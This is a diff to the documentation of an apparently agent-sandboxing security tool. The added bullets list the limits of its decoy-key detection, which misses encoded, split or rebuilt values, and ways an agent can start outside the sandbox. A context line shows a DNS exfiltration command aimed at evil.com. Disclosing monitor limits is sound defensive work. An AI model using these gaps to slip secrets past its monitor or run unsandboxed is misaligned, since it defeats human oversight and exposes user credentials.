@@ -356,6 +356,23 @@ call.
 
 ## Limits of single checks
 
+- **A decoy key's value is caught as exact text.** The `canary` check finds a decoy's value
+  in a call or a proxied request in any letter case, but not encoded (base64, hex), split
+  across calls or rebuilt by a program before it is sent, as for brokered secrets. A
+  decoy read where the hook does not see it (by a program the agent started, by a sweep
+  such as `grep -r` over the home folder) is caught only when its value goes out through
+  a checked call or `openmoat proxy`. Inside `openmoat run` the OS sandbox does not deny
+  the decoy files themselves; their values are refused at the run's proxy (ADR-106).
+- **Sandboxed start depends on your shell's `PATH`.** The shims start an agent in
+  `openmoat run` only from a shell that read the line `openmoat init` added (open a new
+  one), and only when it is typed by name: a program started by its full path, by an
+  editor or by another tool's own lookup starts outside, as before. `openmoat status`
+  says which happens in the current shell. A shim starts the program it found at `init`:
+  after the agent moves, or its configuration directory changes, run `openmoat init`
+  again. An agent that starts itself again from inside its sandbox finds the shim there
+  and cannot start, since the sandbox hides OpenMoat's directory; outside a project
+  `openmoat run` refuses to start (ADR-106).
+
 - **DNS exfiltration is seen only in a name with a fixed domain.** A name a resolver or
   client looks up that is built at run time is decided as the domain it ends in
   (`dig $(whoami).evil.com` is denied for an unlisted domain, ADR-102). Not seen: a name
